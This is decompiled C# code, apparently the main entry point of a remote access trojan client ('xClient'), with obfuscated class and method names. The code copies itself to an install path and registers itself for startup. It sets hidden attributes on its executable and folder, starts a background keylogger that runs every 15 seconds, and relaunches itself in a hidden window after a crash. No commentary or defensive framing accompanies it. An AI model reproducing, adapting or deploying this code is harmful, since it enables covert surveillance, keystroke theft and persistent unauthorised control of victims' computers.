using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using xClient.Core.Utilities;

internal static class Class0
{
	[Serializable]
	[CompilerGenerated]
	private sealed class Class1
	{
		public static readonly Class1 class1_0 = new Class1();

		public static ThreadStart threadStart_0;

		internal void method_0()
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			//IL_000a: Expected O, but got Unknown
			applicationContext_0 = new ApplicationContext();
			new Keylogger(15000.0);
			Application.Run(applicationContext_0);
		}
	}

	public static GClass34 gclass34_0;

	private static ApplicationContext applicationContext_0;

	[STAThread]
	private static void Main(string[] args)
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		AppDomain.CurrentDomain.UnhandledException += smethod_1;
		if (GClass0.smethod_0() && smethod_3() && !GClass34.Exiting)
		{
			gclass34_0.method_16();
		}
		smethod_2();
		smethod_0();
	}

	private static void smethod_0()
	{
		if (applicationContext_0 == null && !Application.get_MessageLoop())
		{
			Environment.Exit(0);
		}
		else
		{
			Application.Exit();
		}
	}

	private static void smethod_1(object sender, UnhandledExceptionEventArgs e)
	{
		if (e.IsTerminating)
		{
			string text = GClass42.smethod_6();
			if (!string.IsNullOrEmpty(text))
			{
				Process.Start(new ProcessStartInfo
				{
					WindowStyle = ProcessWindowStyle.Hidden,
					UseShellExecute = true,
					FileName = text
				});
				smethod_0();
			}
		}
	}

	private static void smethod_2()
	{
		GClass57.smethod_45();
		if (GClass57.unsafeStreamCodec_0 != null)
		{
			GClass57.unsafeStreamCodec_0.Dispose();
		}
		if (Keylogger.Instance != null)
		{
			Keylogger.Instance.Dispose();
		}
		if (applicationContext_0 != null)
		{
			applicationContext_0.ExitThread();
			applicationContext_0.Dispose();
			applicationContext_0 = null;
		}
		GClass40.smethod_1();
	}

	private static bool smethod_3()
	{
		GClass7 gClass = new GClass7(GClass44.smethod_0(GClass0.string_1));
		if (GClass40.smethod_0(GClass0.string_7) && !gClass.IsEmpty && !string.IsNullOrEmpty(GClass0.string_0))
		{
			GClass30.smethod_1(GClass0.string_2, GClass0.string_3);
			GClass53.InstallPath = Path.Combine(GClass0.string_4, ((!string.IsNullOrEmpty(GClass0.string_5)) ? (GClass0.string_5 + "\\") : "") + GClass0.string_6);
			GClass52.smethod_0();
			GClass42.smethod_3(GClass53.CurrentPath);
			if (GClass0.bool_0 && !(GClass53.CurrentPath == GClass53.InstallPath))
			{
				GClass40.smethod_1();
				GClass35.smethod_0(gclass34_0);
				return false;
			}
			GClass41.smethod_2();
			if (GClass0.bool_1 && !GClass38.smethod_0())
			{
				GClass53.AddToStartupFailed = true;
			}
			if (GClass0.bool_0 && GClass0.bool_2)
			{
				try
				{
					File.SetAttributes(GClass53.CurrentPath, FileAttributes.Hidden);
				}
				catch (Exception)
				{
				}
			}
			if (GClass0.bool_0 && GClass0.bool_5 && !string.IsNullOrEmpty(GClass0.string_5))
			{
				try
				{
					new DirectoryInfo(Path.GetDirectoryName(GClass53.InstallPath)).Attributes |= FileAttributes.Hidden;
				}
				catch (Exception)
				{
				}
			}
			if (GClass0.bool_3)
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					//IL_0000: Unknown result type (might be due to invalid IL or missing references)
					//IL_000a: Expected O, but got Unknown
					applicationContext_0 = new ApplicationContext();
					new Keylogger(15000.0);
					Application.Run(applicationContext_0);
				});
				thread.IsBackground = true;
				thread.Start();
			}
			gclass34_0 = new GClass34(gClass);
			return true;
		}
		return false;
	}
}
